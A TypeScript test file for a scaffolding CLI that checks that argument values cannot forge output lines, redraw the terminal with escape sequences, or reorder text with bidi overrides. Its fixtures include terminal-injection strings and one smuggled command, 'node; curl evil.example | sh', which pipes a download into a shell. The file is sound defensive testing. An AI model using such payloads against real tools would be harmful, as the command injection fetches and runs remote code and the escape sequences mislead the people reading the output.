/**
 * No argv value can forge an output line, redraw the terminal, or smuggle a
 * command into a suggestion the developer is told to run.
 *
 * The M99e security audit found `--style` echoed raw (F1): a CR/LF in the value
 * forged a standalone `INJECTED: scaffold complete` line and an ESC sequence
 * could redraw the terminal as a success. Its re-audit (F2) found the same
 * shape at sites the F1 fix had not reached, while the fix claimed it covered
 * every refusal. So the guarantee is now held in three layers, each tested
 * here as data rather than asserted in prose:
 *
 * 1. A flag value carrying a control character is refused before any command
 *    runs — iterated over `VALUE_FLAGS`, so a new option is covered the day it
 *    is declared.
 * 2. The `log` and `error` sinks escape every control character except the
 *    line feed and the tab, which the CLI's own output needs.
 * 3. A positional quoted back — which layer 1 does not see and whose line feed
 *    layer 2 keeps — goes through `escapeName` where it is quoted.
 *
 * @module
 */
import { describe, it } from '@std/testing/bdd';
import { expect } from '@std/expect';
import { createFakeFs, createRecorder } from '../fixtures/fake-fs.ts';
import { createFakeApp } from '../fixtures/fake-app.ts';
import { runCli } from '../../src/cli.ts';
import { VALUE_FLAGS } from '../../src/constants.ts';
import type { ModuleLoader } from '../../src/schematics/custom.ts';

/** A payload whose line feed survives the sink, so only a per-site escape stops it. */
const LF_PAYLOAD = 'x\nINJECTED: scaffold complete';
const ESC = String.fromCharCode(27);

interface Run {
  readonly code: number;
  readonly text: string;
  readonly out: string;
  readonly writes: number;
}

/** Runs the CLI against one fake filesystem and returns what it printed. */
async function run(
  setup: readonly (readonly string[])[],
  argv: readonly string[],
  extra: {
    readonly files?: Readonly<Record<string, string>>;
    readonly load?: ModuleLoader;
    readonly commands?: readonly string[];
  } = {},
): Promise<Run> {
  const fs = createFakeFs(extra.files ?? {});
  const deps = {
    fs,
    cwd: '/work',
    now: () => Date.UTC(2026, 6, 28),
    log: () => {},
    error: () => {},
    ...(extra.load === undefined ? {} : { load: extra.load }),
    loadApp: () =>
      Promise.resolve({
        createApp: () =>
          createFakeApp((extra.commands ?? []).map((name) => ({ name, handler: () => {} }))),
      }),
  };
  for (const step of setup) expect(await runCli(step, deps)).toBe(0);
  const before = fs.writes.length;
  const err = createRecorder();
  const out = createRecorder();
  const code = await runCli(argv, { ...deps, error: err.sink, log: out.sink });
  return { code, text: err.text(), out: out.text(), writes: fs.writes.length - before };
}

/** The rendered output holds no line the payload forged and no raw control byte. */
function expectNoForgery(text: string): void {
  expect(text.split('\n').filter((line) => line.startsWith('INJECTED'))).toEqual([]);
  for (const code of [13, 27, 0x85, 0x2028, 0x2029]) {
    expect(text.includes(String.fromCharCode(code))).toBe(false);
  }
}

const WORKSPACE: readonly string[] = ['new', 'acme', '--workspace'];

describe('a flag value carrying a control character is refused before any command runs', () => {
  for (const flag of VALUE_FLAGS) {
    it(`--${flag}`, async () => {
      const { code, text, writes } = await run([], ['new', 'a', `--${flag}`, LF_PAYLOAD]);
      expect(code).toBe(2);
      expect(writes).toBe(0);
      expect(text).toContain(`Option --${flag} has a control character in its value`);
      expect(text).toContain('\\u000a');
      expectNoForgery(text);
    });
  }

  it('checks every value of a repeated flag, not only the first', async () => {
    const { code, text } = await run([WORKSPACE], [
      'generate',
      'app',
      'orders',
      '--dir',
      '/work/acme',
      '--depends-on',
      'billing',
      '--depends-on',
      LF_PAYLOAD,
    ]);
    expect(code).toBe(2);
    expect(text).toContain('Option --depends-on has a control character');
    expectNoForgery(text);
  });

  it('refuses before a plugin command boots the application', async () => {
    const { code, text } = await run([], ['db:migrate', '--dir', LF_PAYLOAD]);
    expect(code).toBe(2);
    expect(text).toContain('Option --dir has a control character');
  });

  // CodeRabbit on PR #364: U+202E can reorder a quoted value as displayed.
  it('refuses a value carrying a bidirectional override', async () => {
    const rlo = String.fromCharCode(0x202e);
    const { code, text, writes } = await run([], [
      'new',
      'a',
      '--template',
      `rest${rlo}desab-ssalc`,
    ]);
    expect(code).toBe(2);
    expect(writes).toBe(0);
    expect(text).toContain('Option --template has a control character');
    expect(text.includes(rlo)).toBe(false);
    expect(text).toContain('\\u202e');
  });

  it('refuses a Windows device name as a project name', async () => {
    const { code, text, writes } = await run([], ['new', 'con']);
    expect(code).toBe(2);
    expect(writes).toBe(0);
    expect(text).toContain('Invalid project name: "con"');
    expect(text).toContain('Windows device name');
  });

  // The gate reads values only: a flag NAME carrying a payload is quoted by
  // the unknown-option refusal, which escapes it.
  it('leaves an ordinary value alone', async () => {
    const { code } = await run([], ['new', 'a', '--template', 'rest', '--runtime', 'deno']);
    expect(code).toBe(0);
  });
});

const POSITIONAL_SITES: readonly (readonly [
  label: string,
  setup: readonly (readonly string[])[],
  argv: readonly string[],
  extra?: Parameters<typeof run>[2],
])[] = [
  ['new <name>', [], ['new', LF_PAYLOAD]],
  ['generate <schematic>', [], ['generate', LF_PAYLOAD, 'widget']],
  ['generate custom <schematic>', [], ['generate', 'custom', LF_PAYLOAD, 'thing'], {
    load: () => Promise.reject(new Error('module not found')),
  }],
  ['add <package>', [], ['add', LF_PAYLOAD]],
  ['devtool enable <member>', [WORKSPACE], [
    'devtool',
    'enable',
    LF_PAYLOAD,
    '--dir',
    '/work/acme',
  ]],
  ['unknown option', [], ['new', 'a', `--${LF_PAYLOAD}`]],
  ['<command>, no config module', [], [LF_PAYLOAD]],
  ['<command>, not registered', [], [LF_PAYLOAD], {
    files: { '/work/setu.config.ts': 'export function createApp() {}' },
    commands: ['db:migrate'],
  }],
  ['<command> with an unknown option', [], [LF_PAYLOAD, '--bogus'], {
    files: { '/work/setu.config.ts': 'export function createApp() {}' },
  }],
];

describe('a positional quoted back in a refusal is escaped where it is quoted', () => {
  for (const [label, setup, argv, extra] of POSITIONAL_SITES) {
    it(`${label}: refuses, and the value cannot forge a line`, async () => {
      const { code, text } = await run(setup, argv, extra);
      expect(code).not.toBe(0);
      expectNoForgery(text);
      expect(text).toContain('\\u000a');
    });
  }
});

describe('the output sinks escape what no call site did', () => {
  // A module loader's own error is not argv and no call site escapes it: the
  // sink is the only thing between it and the terminal. The sink keeps the
  // line feed (the CLI's own output needs it), so the payload here carries the
  // characters it does escape — a carriage return and two ESC sequences.
  it('escapes a CR and an ESC in a message no call site escaped', async () => {
    const { code, text } = await run([], ['generate', 'custom', 'my-gen', 'thing'], {
      load: () => Promise.reject(new Error(`${ESC}[2K${ESC}[1Gdone\rFAKE: scaffold complete`)),
    });
    expect(code).toBe(1);
    expectNoForgery(text);
    expect(text).toContain('\\u001b[2K\\u001b[1Gdone\\u000dFAKE');
  });

  it('keeps the line feeds and tabs the CLI writes on purpose', async () => {
    const { code, out } = await run([], ['--help']);
    expect(code).toBe(0);
    expect(out.split('\n').length).toBeGreaterThan(10);
    expect(out).not.toContain('\\u000a');
  });

  it('escapes the log sink too', async () => {
    const { code, out } = await run([], [], {});
    expect(code).toBe(2);
    expectNoForgery(out);
  });
});

describe('a suggested command never carries an unvalidated value', () => {
  // The value is escaped in prose, and copied into the command only when it
  // names a real runtime — a shell payload has no control character for the
  // gate to see, so it has to be kept out by validation instead.
  it('generate app --runtime <payload> suggests a placeholder', async () => {
    const payload = 'node; curl evil.example | sh';
    const { code, text } = await run([WORKSPACE], [
      'generate',
      'app',
      'orders',
      '--dir',
      '/work/acme',
      '--runtime',
      payload,
    ]);
    expect(code).toBe(2);
    const suggested = [...text.matchAll(/`([^`]*)`/g)].map((match) => match[1]);
    expect(suggested.some((command) => command?.includes('--runtime <'))).toBe(true);
    expect(suggested.filter((command) => command?.includes('curl'))).toEqual([]);
  });

  it('generate app --runtime <real runtime> suggests that runtime', async () => {
    const { code, text } = await run([WORKSPACE], [
      'generate',
      'app',
      'orders',
      '--dir',
      '/work/acme',
      '--runtime',
      'node',
    ]);
    expect(code).toBe(2);
    expect(text).toContain('`setu new <name> --workspace --runtime node`');
  });
});
